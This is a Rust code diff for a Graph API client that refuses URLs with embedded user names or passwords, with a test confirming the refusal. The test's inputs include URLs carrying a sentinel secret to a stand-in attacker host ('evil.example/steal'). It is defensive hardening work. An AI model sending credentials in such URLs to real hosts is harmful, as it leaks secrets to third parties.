@@ -265,7 +265,10 @@ impl GraphRequest {
     /// `Authorization`, `Proxy-Authorization` and `Cookie`. Attach a token
     /// with [`Self::bearer`] or [`Self::oauth`] (or the client's own): the
     /// credential rules check where those go, and a header would go
-    /// anywhere, [`Self::no_auth`] and plain `http` included.
+    /// anywhere, [`Self::no_auth`] and plain `http` included. (A URL with a
+    /// user name or password is refused on send for the same reason.) Any
+    /// other header goes wherever the request goes, redirects included: put
+    /// no secret in one.
     pub fn header(mut self, name: &'static str, value: impl AsRef<str>) -> Self {
         let Ok(header) = HeaderName::from_bytes(name.as_bytes()) else {
             self.fail(ValidationError::new(name, "invalid header name").into());
@@ -310,7 +313,8 @@ impl GraphRequest {
         self
     }
 
-    /// Send no `Authorization` header ([`Self::header`] cannot add one).
+    /// Send no `Authorization` header ([`Self::header`] cannot add one, nor
+    /// can user info in the URL, which is refused).
     pub fn no_auth(mut self) -> Self {
         self.auth = Auth::None;
         self
@@ -338,6 +342,16 @@ impl GraphRequest {
     fn build_attempt(&mut self) -> Result<HttpRequest> {
         if let Some(e) = self.error.take() {
             return Err(e);
+        }
+        // A transport sends user info as `Authorization: Basic` (reqwest
+        // does), to the URL's host: a credential no rule would check.
+        if !self.url.username().is_empty() || self.url.password().is_some() {
+            return Err(ValidationError::new(
+                "url",
+                "refusing a URL with a user name or password: it would go out as a \
+                 credential; use bearer() or oauth(), which the credential rules check",
+            )
+            .into());
         }
         let body = self.body.materialize()?;
         let mut headers = self.headers.clone();
@@ -1777,6 +1791,85 @@ mod credential_rule_tests {
             );
         }
         assert_eq!(t.requests().len(), 1);
+    }
+
+    /// A user name or password in the URL is a credential no rule checks:
+    /// reqwest sends it as `Authorization: Basic`, to whatever host the URL
+    /// names. It is refused on every URL, with or without a token,
+    /// `no_auth()` included, and through a Graph endpoint configured with
+    /// one: a validation error on `url`, before any request, that never
+    /// shows it.
+    #[tokio::test]
+    async fn a_url_with_user_info_is_refused() {
+        const SENTINEL: &str = "EAAB-SENTINEL-userinfo";
+        let urls = [
+            format!("https://user:{SENTINEL}@evil.example/steal"),
+            format!("http://user:{SENTINEL}@evil.example/steal"),
+            format!("https://{SENTINEL}@evil.example/steal"),
+            format!("https://:{SENTINEL}@evil.example/steal"),
+            format!("https://user:{SENTINEL}@graph.facebook.com/v25.0/me"),
+            format!("https://user:{SENTINEL}@lookaside.fbsbx.com/any/path?mid=1"),
+        ];
+        let t = ScriptedTransport::new();
+        let with_token = client(&t);
+        let without_token = Client::builder()
+            .transport(t.clone())
+            .retry(RetryPolicy::NONE)
+            .build()
+            .unwrap();
+        let assert_refused = |err: Error, what: &str| {
+            assert!(
+                matches!(&err, Error::Validation(v) if v.field == "url"),
+                "{what}: {err}"
+            );
+            let shown = format!("{err} {err:?} {err:#?}");
+            assert!(!shown.contains("SENTINEL"), "{what}: {shown}");
+        };
+        for url in &urls {
+            let url = Url::parse(url).unwrap();
+            for (how, req) in [
+                ("token", with_token.request_url(Method::GET, url.clone())),
+                (
+                    "no_auth",
+                    with_token.request_url(Method::GET, url.clone()).no_auth(),
+                ),
+                (
+                    "no token",
+                    without_token.request_url(Method::GET, url.clone()),
+                ),
+            ] {
+                assert_refused(req.send_raw().await.unwrap_err(), &format!("{url} ({how})"));
+            }
+        }
+        for base in [
+            format!("https://user:{SENTINEL}@proxy.example/"),
+            format!("https://{SENTINEL}@proxy.example/"),
+        ] {
+            let proxied = proxied(&t, &base);
+            assert_refused(proxied.get("me").send_raw().await.unwrap_err(), &base);
+            assert_refused(
+                proxied
+                    .get("oauth/access_token")
+                    .no_auth()
+                    .send_raw()
+                    .await
+                    .unwrap_err(),
+                &base,
+            );
+        }
+        assert!(t.requests().is_empty(), "a URL with user info was sent");
+
+        // The same URLs without it go out.
+        t.push_json(200, json!({}));
+        with_token
+            .request_url(
+                Method::GET,
+                Url::parse("https://graph.facebook.com/v25.0/me").unwrap(),
+            )
+            .send_raw()
+            .await
+            .unwrap();
+        assert_eq!(t.remaining(), 0);
     }
 
     /// A `tracing` subscriber that renders every event and span field.
